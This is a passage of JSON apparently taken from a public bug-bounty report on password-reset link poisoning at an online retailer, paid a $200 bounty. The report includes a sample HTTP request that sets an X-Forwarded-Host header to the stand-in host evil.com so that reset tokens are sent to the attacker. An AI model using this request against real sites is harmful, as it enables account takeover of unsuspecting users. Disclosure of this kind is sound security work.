.678Z","team_member_agreed_on_going_public_at":"2017-08-01T15:05:27.299Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Description\n-------------\nIt is possible to poison the link of the password reset email. This is generally done by altering the [Host header](http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html), but in this case, the WAF is successfully blocking it. The trick here is to add an **X-Forwarded-Host** header in the request so the server is using this value instead of the original Host header to construct the link in the email. \n\n\nAttack scenario\n-----------------\n1. The attacker send a reset password request for another user (and add a X-Forwarded-Host header with a domain controled by the attacker);\n2. The user click on the link;\n3. The attacker receive the reset password token;\n4. The attacker hijack the user account.\n\n\nExample\n----------\n### Request\n```\nPOST /fr/fr/customer/forgot_password HTTP/1.1\nHost: www.boozt.com\nX-Forwarded-Host: evil.com\n[...]\n\n\nforgot_password%5Bemail%5D=pl.maltais%40hotmail.com\u0026forgot_password%5B_token%5D=PxxeRzpschRfb_gIALVPMsuIj4AB4vwKpYbrrNSn-k8\n```\n### Email received\n{F135159}\n\n","bounty_amount":"200.0","formatted_bounty":"$200","original_report_id":null,"original_report_url":null,"attachments":[{"id":135159,"file_name":"boozt_mail_poisoning.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/135/159/da4a2c58437402af25c62c95b6ceafc4d279e36f/boozt_mail_poisoning.png?response-content-disposition=attachment%3B%20filename%3D%22boozt_mail_poisoning.png%22%3B%20filename%2A%3DUTF-8%27%27boozt_mail_poisoning.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T135522Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX